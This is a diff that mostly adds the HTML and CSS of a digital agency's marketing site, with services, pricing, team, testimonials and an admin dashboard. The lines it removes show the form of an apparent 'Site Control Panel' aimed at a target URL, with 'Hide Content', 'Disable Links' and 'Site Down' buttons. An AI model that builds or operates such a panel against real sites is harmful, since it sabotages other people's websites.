+.dadd{font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:8px 18px;background:var(--b);color:var(--w);border:none;border-radius:2px;cursor:none;}
+.dpg{padding:20px;display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;}
+.dp{border:1.5px solid var(--br);border-radius:2px;overflow:hidden;position:relative;}
+.dp-th{height:90px;background:var(--bg2);display:flex;align-items:center;justify-content:center;font-size:26px;}
+.dp-th img{width:100%;height:100%;object-fit:cover;}
+.dp-th video{width:100%;height:100%;object-fit:cover;}
+.dp-info{padding:10px 12px;}
+.dp-n{font-size:12px;font-weight:600;color:var(--b);}
+.dp-c{font-size:11px;color:var(--mu);}
+.dp-del{position:absolute;top:7px;right:7px;width:22px;height:22px;background:rgba(15,23,42,.7);color:var(--w);border:none;border-radius:50%;cursor:none;font-size:9px;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .2s;}
+.dp:hover .dp-del{opacity:1;}
+
+/* ── MODALS (shared) ── */
+.modal-overlay{position:fixed;inset:0;z-index:99999;background:rgba(15,23,42,.85);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity .3s;}
+.modal-overlay.op{opacity:1;pointer-events:auto;}
+.mbox{background:var(--w);max-width:480px;width:100%;padding:40px;border-radius:3px;position:relative;transform:translateY(18px);transition:transform .3s;max-height:90vh;overflow-y:auto;}
+.modal-overlay.op .mbox{transform:none;}
+.mx{position:absolute;top:18px;right:18px;width:30px;height:30px;background:var(--bg2);border:none;border-radius:50%;cursor:none;font-size:13px;display:flex;align-items:center;justify-content:center;}
+.mt{font-family:'Bebas Neue',sans-serif;font-size:28px;color:var(--b);letter-spacing:.5px;margin-bottom:24px;}
+.mf{display:flex;flex-direction:column;gap:16px;}
+.mr{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+.mg{display:flex;flex-direction:column;gap:7px;}
+.ml{font-size:9px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--mu);}
+.mi,.ms,.mta{border:1.5px solid var(--br);border-radius:2px;background:var(--w);color:var(--b);font-family:'Plus Jakarta Sans',sans-serif;font-size:13.5px;padding:11px 14px;outline:none;transition:border-color .2s;width:100%;}
+.mi:focus,.ms:focus,.mta:focus{border-color:var(--b);}
+.ms{appearance:none;cursor:none;}
+.mta{resize:vertical;min-height:80px;}
+.mup{border:1.5px dashed var(--br);border-radius:2px;padding:20px;text-align:center;cursor:none;position:relative;overflow:hidden;transition:border-color .2s;}
+.mup:hover{border-color:var(--b);}
+.mup input{position:absolute;inset:0;opacity:0;cursor:none;}
+.mup-ico{font-size:22px;margin-bottom:6px;}
+.mup-txt{font-size:12px;color:var(--mu);}
+.mup-note{font-size:10.5px;color:rgba(100,116,139,.6);margin-top:3px;}
+.mup-prev{width:100%;max-height:120px;object-fit:cover;margin-top:10px;display:none;border-radius:2px;}
+.mup-vid-prev{width:100%;max-height:160px;margin-top:10px;display:none;border-radius:2px;background:var(--b);}
+.msub{font-size:10.5px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:13px 28px;background:var(--b);color:var(--w);border:none;border-radius:2px;cursor:none;align-self:flex-start;transition:background .2s;}
+.msub:hover{background:#1E293B;}
+
+/* ── RESPONSIVE ── */
+@media(max-width:1100px){.svc-grid{grid-template-columns:repeat(2,1fr)!important;}.about-grid{gap:48px;}}
+@media(max-width:900px){
+  nav{padding:0 24px;}.nlinks{display:none;}.nhb{display:flex;}
+  .sec,#portfolio,.svc-inner,#vtesti,#testimonials,#pricing,#contact,footer,#team-sub{padding-left:24px!important;padding-right:24px!important;}
+  #hero{padding:120px 24px 56px;}.about-grid,.contact-inner{grid-template-columns:1fr;gap:40px;}
+  .tst-grid,.team-heads-grid{grid-template-columns:1fr;}.price-grid{grid-template-columns:1fr;max-width:440px;}
+  .proc-grid{flex-direction:column;max-width:440px;}.proc-step{border-right:none;border-bottom:1px solid var(--br);}
+  .proc-step:last-child{border-bottom:none;}.svc-head{flex-direction:column;gap:16px;}.svc-sub{text-align:left;}
+  .pp-box{grid-template-columns:1fr;}.pp-left{min-height:220px;}.dstats{grid-template-columns:1fr;}
+  .vt-grid,.tm-grid{grid-template-columns:repeat(2,1fr);}
+}
+@media(max-width:640px){
+  .svc-grid{grid-template-columns:1fr!important;}#pgrid{grid-template-columns:1fr;}
+  .crow,.mr{grid-template-columns:1fr;}.hero-bot{flex-direction:column;align-items:flex-start;}
+  .ftop{flex-direction:column;gap:28px;}.tst-grid{grid-template-columns:1fr;}
+  .vt-grid,.tm-grid{grid-template-columns:1fr;max-width:320px;margin-left:auto;margin-right:auto;}
+}
+</style>
 </head>
 <body>
-    <div class="container">
-        <h1>Site Control Panel</h1>
-        <p>Target: <?php echo $site_url; ?></p>
-        
-        <?php if (isset($message)): ?>
-            <div class="message"><?php echo $message; ?></div>
-        <?php endif; ?>
-        
-        <form method="post">
-            <button type="submit" name="action" value="hide_content" class="btn-hide">Hide Content</button>
-            <button type="submit" name="action" value="disable_links" class="btn-links">Disable Links</button>
-            <button type="submit" name="action" value="site_down" class="btn-down">Site Down</button>
-            <button type="submit" name="action" value="none" class="btn-reset">Reset</button>
-        </form>
-        
-        <p><small>Educational Purpose Only.</small></p>
+<div id="cd"></div><div id="cr"></div>
+
+<!-- PRELOADER -->
+<div id="PRE">
+  <div id="PRE-N">0</div>
+  <div id="PRE-B"><div id="PRE-F"></div></div>
+  <div id="PRE-L">Loading Studio</div>
+</div>
+
+<!-- MOBILE MENU -->
+<div id="MM">
+  <button class="mmx" onclick="closeMM()">✕</button>
+  <a class="mmlink" href="#about" onclick="closeMM()">About</a>
+  <a class="mmlink" href="#services" onclick="closeMM()">Services</a>
+  <a class="mmlink" href="#portfolio" onclick="closeMM()">Work</a>
+  <a class="mmlink" href="#team" onclick="closeMM()">Team</a>
+  <a class="mmlink" href="#pricing" onclick="closeMM()">Pricing</a>
+  <a class="mmlink" href="#contact" onclick="closeMM()">Contact</a>
+</div>
+
+<!-- NAV -->
+<nav id="NAV">
+  <div class="nlogo" onclick="window.scrollTo({top:0,behavior:'smooth'})">
+    <svg width="26" height="20" viewBox="0 0 36 28" fill="none">
+      <rect x="0"  y="22" width="4" height="6"  rx="1.5" fill="#3B82F6" opacity=".2"/>
+      <rect x="5"  y="17" width="4" height="11" rx="1.5" fill="#3B82F6" opacity=".42"/>
+      <rect x="10" y="11" width="4" height="17" rx="1.5" fill="#3B82F6" opacity=".65"/>
+      <rect x="15" y="4"  width="4" height="24" rx="1.5" fill="#3B82F6"/>
+      <rect x="20" y="13" width="4" height="15" rx="1.5" fill="#3B82F6" opacity=".55"/>
+      <rect x="25" y="4"  width="4" height="24" rx="1.5" fill="#3B82F6"/>
+      <rect x="30" y="11" width="4" height="17" rx="1.5" fill="#3B82F6" opacity=".65"/>
+      <circle cx="17" cy="2.5" r="2" fill="white" opacity=".9"/>
+      <circle cx="27" cy="2.5" r="2" fill="white" opacity=".9"/>
+    </svg>
+    <span class="nlogo-txt"><em>V</em>YBREX</span>
+  </div>
+  <ul class="nlinks">
+    <li><a href="#about">About</a></li>
+    <li><a href="#services">Services</a></li>
+    <li><a href="#portfolio">Work</a></li>
+    <li><a href="#team">Team</a></li>
+    <li><a href="#pricing">Pricing</a></li>
+  </ul>
+  <a class="ncta" href="#contact">Get in Touch</a>
+  <button class="nhb" onclick="openMM()"><span></span><span></span><span></span></button>
+</nav>
+
+<!-- HERO -->
+<section id="hero">
+  <div class="hero-bg">VYBREX</div>
+  <div class="hero-tag">Rawalpindi · UK · USA · Australia</div>
+  <h1 class="hero-h">WE BUILD<br><span class="blue">BRANDS</span><br><span class="out">THAT WIN.</span></h1>
+  <div class="hero-bot">
+    <p class="hero-sub">Full-service digital agency — websites, branding, marketing, video. Fast delivery. Fair pricing. World-class quality.</p>
+    <div class="hero-btns">
+      <a class="hbtn hbtn-p" href="#portfolio">See Our Work</a>
+      <a class="hbtn hbtn-s" href="#contact">Start a Project</a>
     </div>
+  </div>
+</section>
+
+<!-- CLIENT LOGO TICKER -->
+<div class="ticker">
+  <div class="t-track" id="tickerTrack">
+    <!-- Rendered by JS from localStorage + defaults -->
+  </div>
+</div>
+
+<!-- ABOUT -->
+<section id="about" class="sec">
+  <div class="about-grid">
+    <div>
+      <div class="sec-lbl rv">Who We Are</div>
+      <h2 class="sec-title rv">A QUIET<br>TEAM.<br><span>LOUD</span><br>RESULTS.</h2>
+      <p class="about-body rv">Vybrex Solutions is a full-service digital agency from Rawalpindi, Pakistan — delivering world-class digital work at 60–70% less than UK and AU market rates. We are the silent powerhouse behind your brand.</p>
+    </div>
+    <div class="stats">
+      <div class="stat rv"><div class="snum">8<em>+</em></div><div><div class="slbl">Services</div><div class="ssub">Web, design, SEO, video, CRM and more</div></div></div>
+      <div class="stat rv"><div class="snum">3<em>×</em></div><div><div class="slbl">Continents</div><div class="ssub">UK, Australia, USA — active clients</div></div></div>
+      <div class="stat rv"><div class="snum">48<em>H</em></div><div><div class="slbl">Avg Turnaround</div><div class="ssub">Most projects delivered in 48 hours</div></div></div>
+      <div class="stat rv"><div class="snum">70<em>%</em></div><div><div class="slbl">Cost Saving</div><div class="ssub">vs UK/AU agency rates — same quality</div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- SERVICES -->
+<section id="services"><div class="svc-inner">
+  <div class="svc-head">
+    <div><div class="sec-lbl rv" style="color:rgba(255,255,255,.3);">What We Do</div><h2 class="sec-title-w rv">EVERY<br><span>DIGITAL</span><br>SERVICE.</h2></div>
+    <p class="svc-sub rv">From a single website to a full white-label partnership — we handle it all.</p>
+  </div>
+  <div class="svc-grid">
+    <div class="sc rv"><div class="sc-n">01</div><div class="sc-ico">🌐</div><div class="sc-name">Web Development</div><div class="sc-desc">Custom websites, WordPress, Next.js, React — built fast, mobile-first, SEO-ready.</div><div class="sc-price">From $250 USD</div><span class="sc-arr">↗</span></div>
+    <div class="sc rv"><div class="sc-n">02</div><div class="sc-ico">🛍️</div><div class="sc-name">Shopify Stores</div><div class="sc-desc">Custom themes, migration, speed optimisation, Klaviyo email flows, app setup.</div><div class="sc-price">From $300 USD</div><span class="sc-arr">↗</span></div>
+    <div class="sc rv"><div class="sc-n">03</div><div class="sc-ico">🎨</div><div class="sc-name">Brand &amp; Design</div><div class="sc-desc">Logo systems, brand identity, social media kits, UI/UX — Figma-delivered.</div><div class="sc-price">From $150 USD</div><span class="sc-arr">↗</span></div>
+    <div class="sc rv"><div class="sc-n">04</div><div class="sc-ico">📈</div><div class="sc-name">Digital Marketing</div><div class="sc-desc">Meta Ads, Google Ads, content strategy, email campaigns — measurable growth.</div><div class="sc-price">From $120/mo</div><span class="sc-arr">↗</span></div>
+    <div class="sc rv"><div class="sc-n">05</div><div class="sc-ico">🔍</div><div class="sc-name">SEO &amp; Local Rank</div><div class="sc-desc">Google ranking, local SEO, Google Business setup — more calls, more bookings.</div><div class="sc-price">From $100/mo</div><span class="sc-arr">↗</span></div>
+    <div class="sc rv"><div class="sc-n">06</div><div class="sc-ico">🎬</div><div class="sc-name">Video Editing</div><div class="sc-desc">Reels, brand films, ad creatives, YouTube — Premiere Pro &amp; After Effects.</div><div class="sc-price">From $60 USD</div><span class="sc-arr">↗</span></div>
+    <div class="sc rv"><div class="sc-n">07</div><div class="sc-ico">✍️</div><div class="sc-name">Content Writing</div><div class="sc-desc">SEO blogs, website copy, email sequences, social captions — words that convert.</div><div class="sc-price">From $30/post</div><span class="sc-arr">↗</span></div>
+    <div class="sc rv"><div class="sc-n">08</div><div class="sc-ico">⚙️</div><div class="sc-name">HubSpot &amp; CRM</div><div class="sc-desc">CRM setup, sales automation, Klaviyo flows, HubSpot integration — close deals.</div><div class="sc-price">From $200 USD</div><span class="sc-arr">↗</span></div>
+  </div>
+</div></section>
+
+<!-- PROCESS -->
+<section id="process" class="sec">
+  <div class="sec-lbl rv">How We Work</div>
+  <h2 class="sec-title rv">SIMPLE.<br><span>ALWAYS.</span></h2>
+  <div class="proc-grid">
+    <div class="proc-step rv"><div class="proc-num">01</div><div class="proc-name">Brief</div><div class="proc-desc">You send us the project brief and requirements</div><div class="proc-dot"></div></div>
+    <div class="proc-step rv"><div class="proc-num">02</div><div class="proc-name">Quote</div><div class="proc-desc">We respond with price and timeline in 4 hours</div><div class="proc-dot"></div></div>
+    <div class="proc-step rv"><div class="proc-num">03</div><div class="proc-name">Build</div><div class="proc-desc">We work. You get updates at every key stage</div><div class="proc-dot"></div></div>
+    <div class="proc-step rv"><div class="proc-num">04</div><div class="proc-name">Review</div><div class="proc-desc">You review and we refine — free revisions included</div><div class="proc-dot"></div></div>
+    <div class="proc-step rv"><div class="proc-num">05</div><div class="proc-name">Deliver</div><div class="proc-desc">Final files handed over. Project complete.</div><div class="proc-dot"></div></div>
+  </div>
+</section>
+
+<!-- PORTFOLIO -->
+<section id="portfolio"><div class="port-inner">
+  <div class="port-top">
+    <div><div class="sec-lbl rv">Selected Work</div><h2 class="sec-title rv">OUR<br><span>PORTFOLIO.</span></h2></div>
+    <div class="pfilters">
+      <button class="pf on" onclick="filterP('all',this)">All</button>
+      <button class="pf" onclick="filterP('Web Development',this)">Web</button>
+      <button class="pf" onclick="filterP('Shopify',this)">Shopify</button>
+      <button class="pf" onclick="filterP('Graphic Design',this)">Design</button>
+      <button class="pf" onclick="filterP('Digital Marketing',this)">Marketing</button>
+      <button class="pf" onclick="filterP('Video Editing',this)">Video</button>
+    </div>
+  </div>
+  <div id="pgrid"></div>
+</div></section>
+
+<!-- TEAM — FOUNDERS (big photos) -->
+<section id="team" class="sec">
+  <div class="sec-lbl rv">The Team</div>
+  <h2 class="sec-title rv">TWO PEOPLE.<br><span>UNLIMITED</span> OUTPUT.</h2>
+  <div class="team-heads-grid">
+    <div class="tc rv">
+      <div class="tc-photo-wrap">
+        <div class="tc-photo-ph" id="am-ph">
+          <div class="tc-photo-init">AM</div>
+          <div class="tc-upload-ov" id="am-ov" onclick="triggerPhoto('am')">
+            <span style="font-size:28px;">📸</span><div class="tc-upload-lbl">Upload Photo</div>
+          </div>
+        </div>
+        <img class="tc-photo" id="am-img" src="" alt="Abdul Mueed" style="display:none;">
+      </div>
+      <div class="tc-content">
+        <div class="tc-name">ABDUL MUEED</div>
+        <div class="tc-role">CEO &amp; Tech Lead</div>
+        <p class="tc-bio">Co-founder of Vybrex Solutions. Full-stack developer and digital strategist. Certified in web development, currently completing BS-IT at University of Punjab.</p>
+        <div class="tc-skills"><span class="tc-skill">Web Dev</span><span class="tc-skill">Shopify</span><span class="tc-skill">SEO</span><span class="tc-skill">HubSpot</span><span class="tc-skill">CRM</span></div>
+      </div>
+    </div>
+    <div class="tc rv">
+      <div class="tc-photo-wrap">
+        <div class="tc-photo-ph" id="am2-ph">
+          <div class="tc-photo-init" style="color:rgba(34,197,94,.12);">A</div>
+          <div class="tc-upload-ov" id="am2-ov" onclick="triggerPhoto('am2')">
+            <span style="font-size:28px;">📸</span><div class="tc-upload-lbl">Upload Photo</div>
+          </div>
+        </div>
+        <img class="tc-photo" id="am2-img" src="" alt="Amina" style="display:none;">
+      </div>
+      <div class="tc-content">
+        <div class="tc-name">AMINA</div>
+        <div class="tc-role">Creative Director</div>
+        <p class="tc-bio">The creative brain behind every brand we build. Logo systems, brand identities, content direction, video editing — if it looks good, it's Amina's work.</p>
+        <div class="tc-skills"><span class="tc-skill">Branding</span><span class="tc-skill">Figma</span><span class="tc-skill">Video</span><span class="tc-skill">Content</span><span class="tc-skill">Social</span></div>
+      </div>
+    </div>
+  </div>
+  <input type="file" id="photo-in-am"  accept="image/*" style="display:none" onchange="savePhoto('am',event)">
+  <input type="file" id="photo-in-am2" accept="image/*" style="display:none" onchange="savePhoto('am2',event)">
+</section>
+
+<!-- TEAM — REST OF TEAM (3-col carousel) -->
+<section id="team-sub">
+  <div class="tm-sub-inner">
+    <div class="tm-sub-lbl rv">Our Full Team</div>
+    <div class="tm-grid" id="tmGrid"></div>
+    <div class="tm-add-card" id="tmAddCard" onclick="openTMMod()">
+      <div class="tm-add-ico">+</div>
+      <div class="tm-add-lbl">Add Team Member</div>
+    </div>
+  </div>
+</section>
+
+<!-- VIDEO TESTIMONIALS -->
+<section id="vtesti">
+  <div class="vt-inner">
+    <div class="vt-top">
+      <div><div class="sec-lbl rv" style="color:rgba(255,255,255,.3);">Client Videos</div><h2 class="sec-title-w rv">HEAR IT<br><span>FROM THEM.</span></h2></div>
+      <button class="vt-add-btn" id="vtAddBtn" onclick="openVTMod()">+ Add Video</button>
+    </div>
+    <div class="vt-grid" id="vtGrid"></div>
+  </div>
+</section>
+
+<!-- TEXT TESTIMONIALS -->
+<section id="testimonials"><div class="tst-inner">
+  <div class="sec-lbl rv">What Clients Say</div>
+  <h2 class="sec-title rv">REAL WORDS.<br><span>REAL CLIENTS.</span></h2>
+  <div class="tst-grid">
+    <div class="tcard rv"><div class="tcard-stars">★★★★★</div><div class="tcard-q">How fast you actually are. I expected weeks. Got it in days. My client was genuinely shocked by the quality.</div><div class="tcard-sep"></div><div class="tcard-name">Sarah M.</div><div class="tcard-role">Digital Agency Owner, UK</div></div>
+    <div class="tcard rv"><div class="tcard-stars">★★★★★</div><div class="tcard-q">They understood what I was trying to say — not just what I asked for. I've been burned by agencies before. Not here.</div><div class="tcard-sep"></div><div class="tcard-name">James T.</div><div class="tcard-role">Marketing Agency Owner, Australia</div></div>
+    <div class="tcard rv"><div class="tcard-stars">★★★★★</div><div class="tcard-q">I outsource all my client design work to Vybrex under my brand. My clients have no idea. The quality is exactly what I need.</div><div class="tcard-sep"></div><div class="tcard-name">Lena K.</div><div class="tcard-role">Creative Studio Founder, USA</div></div>
+  </div>
+</div></section>
+
+<!-- PRICING -->
+<section id="pricing"><div class="price-inner">
+  <div class="sec-lbl rv">Transparent Pricing</div>
+  <h2 class="sec-title rv">NO<br><span>SURPRISES.</span><br>EVER.</h2>
+  <div class="price-grid">
+    <div class="pcard rv"><div class="pname">Starter</div><div class="pamount">$250</div><div class="pper">one-time · per project</div><ul class="pfeats"><li class="pfeat">5-page custom website</li><li class="pfeat">Mobile responsive</li><li class="pfeat">Basic SEO setup</li><li class="pfeat">Contact form</li><li class="pfeat">2 revisions included</li><li class="pfeat">Delivered in 5 days</li></ul><a class="pbtn pbtn-d" href="#contact">Get Started →</a></div>
+    <div class="pcard feat rv"><div class="pbadge">Popular</div><div class="pname">Professional</div><div class="pamount">$450</div><div class="pper">one-time · per project</div><ul class="pfeats"><li class="pfeat">10-page custom website</li><li class="pfeat">Shopify or WordPress</li><li class="pfeat">Full SEO optimisation</li><li class="pfeat">Google Business setup</li><li class="pfeat">Unlimited revisions</li><li class="pfeat">Delivered in 7 days</li></ul><a class="pbtn pbtn-l" href="#contact">Get Started →</a></div>
+    <div class="pcard rv"><div class="pname">Agency Partner</div><div class="pamount">$400</div><div class="pper">per month · white label</div><ul class="pfeats"><li class="pfeat">Unlimited project briefs</li><li class="pfeat">NDA + brand protection</li><li class="pfeat">48-hour turnaround</li><li class="pfeat">Web, design, video, SEO</li><li class="pfeat">Dedicated contact</li><li class="pfeat">First project free trial</li></ul><a class="pbtn pbtn-d" href="#contact">Get Started →</a></div>
+  </div>
+</div></section>
+
+<!-- CONTACT -->
+<section id="contact"><div class="contact-inner">
+  <div>
+    <div class="sec-lbl rv">Get In Touch</div>
+    <h2 class="sec-title rv">LET'S BUILD<br><span>SOMETHING</span><br>TOGETHER.</h2>
+    <div class="contact-info">
+      <div class="ci rv"><div class="ci-ico">📧</div><div><div class="ci-lbl">Email</div><div class="ci-val"><a href="mailto:CEO@vybrexsolutions.com">CEO@vybrexsolutions.com</a></div></div></div>
+      <div class="ci rv"><div class="ci-ico">📱</div><div><div class="ci-lbl">WhatsApp</div><div class="ci-val"><a href="https://wa.me/923159242015">+92 315 9242015</a></div></div></div>
+      <div class="ci rv"><div class="ci-ico">🌐</div><div><div class="ci-lbl">Website</div><div class="ci-val"><a href="#">vybrexsolutions.com</a></div></div></div>
+      <div class="ci rv"><div class="ci-ico">📍</div><div><div class="ci-lbl">Based In</div><div class="ci-val">Rawalpindi, Pakistan</div></div></div>
+    </div>
+  </div>
+  <form class="cform rv" onsubmit="sendForm(event)">
+    <div class="crow"><div class="cg"><label class="clbl">First Name</label><input class="cinp" placeholder="John" required></div><div class="cg"><label class="clbl">Last Name</label><input class="cinp" placeholder="Smith"></div></div>
+    <div class="cg"><label class="clbl">Email</label><input class="cinp" type="email" placeholder="john@company.com" required></div>
+    <div class="cg"><label class="clbl">Service Needed</label><select class="csel"><option value="">Select...</option><option>Web Development</option><option>Shopify Store</option><option>Brand &amp; Design</option><option>Digital Marketing</option><option>SEO</option><option>Video Editing</option><option>Content Writing</option><option>HubSpot &amp; CRM</option><option>White Label Partnership</option><option>Full Package</option></select></div>
+    <div class="cg"><label class="clbl">Project Details</label><textarea class="cta" placeholder="Brief description, budget, timeline..." required></textarea></div>
+    <button type="submit" class="csub">Send Message →</button>
+  </form>
+</div></section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="ftop">
+    <div><div class="flogo"><em>V</em>YBREX SOLUTIONS</div><p class="ftag">Full-service digital agency. Rawalpindi, Pakistan. World-class digital work for businesses worldwide.</p></div>
+    <div><div class="fcol-title">Services</div><a class="flink" href="#services">Web Development</a><a class="flink" href="#services">Shopify Stores</a><a class="flink" href="#services">Brand &amp; Design</a><a class="flink" href="#services">SEO &amp; Marketing</a><a class="flink" href="#services">Video Editing</a></div>
+    <div><div class="fcol-title">Company</div><a class="flink" href="#about">About</a><a class="flink" href="#portfolio">Work</a><a class="flink" href="#team">Team</a><a class="flink" href="#pricing">Pricing</a><a class="flink" href="#contact">Contact</a></div>
+    <div><div class="fcol-title">Contact</div><a class="flink" href="mailto:CEO@vybrexsolutions.com">CEO@vybrexsolutions.com</a><a class="flink" href="https://wa.me/923159242015">+92 315 9242015</a><a class="flink" href="#">vybrexsolutions.com</a></div>
+  </div>
+  <div class="fbot"><div class="fcopy">© 2025 Vybrex Solutions · All rights reserved</div><div class="fsocs"><a class="fsoc" href="#">in</a><a class="fsoc" href="#">ig</a><a class="fsoc" href="https://wa.me/923159242015">wa</a></div></div>
+</footer>
+
+<!-- ══ DASHBOARD ══ -->
+<div id="DASH">
+  <div class="dh"><div class="dh-title">VYBREX DASHBOARD</div><button class="dh-back" onclick="closeDash()">← Close</button></div>
+  <div class="db">
+    <div class="dstats">
+      <div class="dstat"><div class="dstat-n" id="dN">0</div><div class="dstat-l">Portfolio Projects</div></div>
+      <div class="dstat"><div class="dstat-n" id="dV">0</div><div class="dstat-l">Client Videos</div></div>
+      <div class="dstat"><div class="dstat-n" id="dT">0</div><div class="dstat-l">Team Members</div></div>
+    </div>
+    <!-- Portfolio -->
+    <div class="dpanel">
+      <div class="dph">Portfolio Projects <button class="dadd" onclick="openProjMod()">+ Add Project</button></div>
+      <div class="dpg" id="DPG"></div>
+    </div>
+    <!-- Videos -->
+    <div class="dpanel">
+      <div class="dph">Client Video Testimonials <button class="dadd" onclick="openVTMod()">+ Add Video</button></div>
+      <div class="dpg" id="DVG"></div>
+    </div>
+    <!-- Team -->
+    <div class="dpanel">
+      <div class="dph">Team Members <button class="dadd" onclick="openTMMod()">+ Add Member</button></div>
+      <div class="dpg" id="DTG"></div>
+    </div>
+    <!-- Client Logos -->
+    <div class="dpanel">
+      <div class="dph">Client Logos (Ticker) <button class="dadd" onclick="openLogoMod()">+ Add Client</button></div>
+      <div class="dpg" id="DLG"></div>
+    </div>
+    <!-- Founder photos -->
+    <div class="dpanel">
+      <div class="dph">Founder Photos</div>
+      <div style="padding:20px;display:flex;gap:16px;">
+        <button class="dadd" onclick="document.getElementById('photo-in-am').click()">📸 Upload Abdul's Photo</button>
+        <button class="dadd" onclick="document.getElementById('photo-in-am2').click()">📸 Upload Amina's Photo</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Portfolio popup -->
+<div id="PPO">
+  <div class="pp-box" style="position:relative;">
+    <div class="pp-left" id="ppL"><span id="ppE">📁</span><img id="ppI" src="" alt="" style="display:none;"></div>
+    <div class="pp-right">
+      <button class="ppx" onclick="closePP()">✕</button>
+      <div class="pp-cat" id="ppC"></div>
+      <div class="pp-title" id="ppT"></div>
+      <div class="pp-desc" id="ppD"></div>
+      <div class="pp-tags" id="ppTg"></div>
+      <div class="pp-actions">
+        <a class="ppbtn ppbtn-p" href="#contact">Start Similar →</a>
+        <a class="ppbtn ppbtn-s" href="#services">Our Services</a>
+        <a class="ppbtn ppbtn-p" id="ppPdf" href="#" target="_blank" style="display:none;background:var(--bg2);color:var(--b);">📄 PDF</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Video play modal -->
+<div id="VPLAY" class="modal-overlay" style="background:rgba(15,23,42,.97);">
+  <div class="vplay-inner">
+    <button class="vplay-close" onclick="closeVPlay()">✕</button>
+    <video class="vplay-video" id="vplayVid" controls playsinline></video>
+    <div class="vplay-name" id="vplayName"></div>
+    <div class="vplay-role" id="vplayRole"></div>
+  </div>
+</div>
+
+<!-- ADD PROJECT MODAL -->
+<div id="PMOD" class="modal-overlay">
+  <div class="mbox">
+    <button class="mx" onclick="closeProjMod()">✕</button>
+    <div class="mt">ADD PROJECT</div>
+    <form class="mf" onsubmit="saveProj(event)">
+      <div class="mr">
+        <div class="mg"><label class="ml">Project Name</label><input class="mi" id="pn" placeholder="e.g. Shopify Store" required></div>
+        <div class="mg"><label class="ml">Year</label><input class="mi" id="py" value="2025"></div>
+      </div>
+      <div class="mg"><label class="ml">Category</label><select class="ms" id="pc"><option value="">Select...</option><option>Web Development</option><option>Shopify</option><option>Graphic Design</option><option>Digital Marketing</option><option>SEO</option><option>Video Editing</option><option>Content Writing</option><option>HubSpot &amp; CRM</option></select></div>
+      <div class="mg"><label class="ml">Description</label><textarea class="mta" id="pd" rows="2" placeholder="Brief description..."></textarea></div>
+      <div class="mg"><label class="ml">Thumbnail</label><div class="mup" id="pimg-up"><input type="file" accept="image/*" onchange="handleFile(event,'pimg-prev','pimg-data')"><div class="mup-ico">🖼️</div><div class="mup-txt">Click to upload</div><img class="mup-prev" id="pimg-prev"></div></div>
+      <div class="mg"><label class="ml">Portfolio PDF <span style="font-weight:400;color:var(--mu)">(optional)</span></label><div class="mup" id="ppdf-up"><input type="file" accept="application/pdf" onchange="handleFile(event,'ppdf-name','ppdf-data',true)"><div class="mup-ico">📄</div><div class="mup-txt" id="ppdf-name">Click to upload PDF</div></div></div>
+      <button type="submit" class="msub">Save Project →</button>
+    </form>
+  </div>
+</div>
+
+<!-- ADD VIDEO MODAL -->
+<div id="VTMOD" class="modal-overlay">
+  <div class="mbox">
+    <button class="mx" onclick="closeVTMod()">✕</button>
+    <div class="mt">ADD CLIENT VIDEO</div>
+    <form class="mf" onsubmit="saveVT(event)">
+      <div class="mg"><label class="ml">Client Name</label><input class="mi" id="vtn" placeholder="e.g. Sarah M." required></div>
+      <div class="mg"><label class="ml">Role &amp; Country</label><input class="mi" id="vtr" placeholder="e.g. Agency Owner, UK" required></div>
+      <div class="mg">
+        <label class="ml">Video URL <span style="font-weight:400;color:var(--mu)">(paste a direct video link)</span></label>
+        <input class="mi" id="vtv-url" placeholder="https://example.com/video.mp4 or YouTube/Vimeo link">
+        <div style="font-size:10.5px;color:var(--mu);margin-top:4px;">Paste a direct .mp4 link — video will play directly on site</div>
+      </div>
+      <div class="mg" style="text-align:center;color:var(--mu);font-size:11px;letter-spacing:2px;text-transform:uppercase;">— OR —</div>
+      <div class="mg">
+        <label class="ml">Upload Video File <span style="font-weight:400;color:var(--mu)">(9:16 vertical · MP4/MOV)</span></label>
+        <div class="mup" id="vtv-up">
+          <input type="file" accept="video/*" onchange="handleVidFile(event)">
+          <div class="mup-ico">🎬</div>
+          <div class="mup-txt" id="vtv-txt">Click to upload video (MP4/MOV)</div>
+          <div class="mup-note">9:16 vertical · max 50MB</div>
+          <video class="mup-vid-prev" id="vtv-prev" muted playsinline controls></video>
+        </div>
+      </div>
+      <button type="submit" class="msub">Save Video →</button>
+    </form>
+  </div>
+</div>
+
+<!-- ADD TEAM MEMBER MODAL -->
+<div id="TMMOD" class="modal-overlay">
+  <div class="mbox">
+    <button class="mx" onclick="closeTMMod()">✕</button>
+    <div class="mt">ADD TEAM MEMBER</div>
+    <form class="mf" onsubmit="saveTM(event)">
+      <div class="mg"><label class="ml">Full Name</label><input class="mi" id="tmn" placeholder="e.g. Haris Junaid" required></div>
+      <div class="mg"><label class="ml">Designation</label><input class="mi" id="tmd" placeholder="e.g. Senior Developer" required></div>
+      <div class="mg"><label class="ml">Photo</label><div class="mup" id="tmimg-up"><input type="file" accept="image/*" onchange="handleFile(event,'tmimg-prev','tmimg-data')"><div class="mup-ico">📸</div><div class="mup-txt">Click to upload photo</div><img class="mup-prev" id="tmimg-prev"></div></div>
+      <button type="submit" class="msub">Add Member →</button>
+    </form>
+  </div>
+</div>
+
+<!-- ADD CLIENT LOGO MODAL -->
+<div id="LMOD" class="modal-overlay">
+  <div class="mbox">
+    <button class="mx" onclick="closeLogoMod()">✕</button>
+    <div class="mt">ADD CLIENT</div>
+    <form class="mf" onsubmit="saveLogo(event)">
+      <div class="mg"><label class="ml">Client / Company Name</label><input class="mi" id="lname" placeholder="e.g. GoPro" required></div>
+      <div class="mg">
+        <label class="ml">Logo Image <span style="font-weight:400;color:var(--mu)">(optional)</span></label>
+        <div class="mup" id="limg-up"><input type="file" accept="image/*" onchange="handleFile(event,'limg-prev','limg-data')"><div class="mup-ico">🖼️</div><div class="mup-txt">Click to upload logo</div><img class="mup-prev" id="limg-prev"></div>
+      </div>
